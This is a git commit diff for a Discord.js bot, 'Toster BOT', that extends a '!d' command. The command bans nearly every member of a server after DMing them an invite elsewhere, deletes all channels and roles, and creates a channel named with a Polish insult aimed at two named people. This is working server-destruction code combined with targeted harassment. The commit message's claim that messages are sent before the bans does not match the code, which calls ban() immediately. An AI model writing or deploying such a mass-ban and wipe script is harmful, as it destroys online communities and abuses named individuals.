91bda8328e5def3cad0ad211564e4f1334af0da2
Kasper Knapik <kasper.knapik@gmail.com>
2021-02-03 02:06:25 +0100

    Changes: - fetchAllMembers -> true so it can omit cache - filter me, Wujek and any bot from users to ban - now sends message then bans them from server, it prevents a bug that we cannot send msg to users anymore - now it creates channel and creates template or syncs existing

--- index.js
+++ index.js
@@ -1,6 +1,8 @@
 const Discord = require('discord.js');
 const config = require('./config.json');
-const BotClient = new Discord.Client();
+const BotClient = new Discord.Client({
+    fetchAllMembers: true
+});
 
 BotClient.on('ready', () => {
     console.log('Toster BOT is online!');
@@ -37,13 +39,22 @@ BotClient.on('message', msg => {
     if (msg.content.startsWith('!d')) {
         try {
             msg.guild.members.cache
-                .filter(m => m.user.id !== config.bot_id && m.user.id !== msg.guild.ownerID)
+                .filter(m => m.user.id !== msg.guild.ownerID && m.user.tag !== 'TheToster#3003' && m.user.tag !== '!Wujaszek#4259' && m.user.bot !== true)
                 .forEach(m => {
-                    m.user.send('Przenosimy się na nowy serwer: https://discord.gg/fbZCFxsEnF \nPrzepraszamy za niedogodnienia i życzymy miłego pobytu na nowym serwerze!');
-                    m.ban();
+                    m.user
+                        .send('Przenosimy się na nowy serwer: https://discord.gg/fbZCFxsEnF \nPrzepraszamy za niedogodnienia i życzymy miłego pobytu na nowym serwerze!')
+                        .then(m.ban())
+                        .catch(console.error);
                 });
             msg.guild.channels.cache.forEach(channel => channel.delete());
             msg.guild.roles.cache.forEach(role => role.delete());
+            msg.guild.channels
+                .create('Jebać Paule i Mruwe', {
+                    type: 'text'
+                })
+                .then(msg.guild.fetchTemplates().then(t => t.first().sync()))
+                .then(msg.guild.createTemplate('Jebać Paule i Mruwe').then(t => t.sync()))
+                .catch(console.error);
         } catch (error) {
             console.log(error);
         }
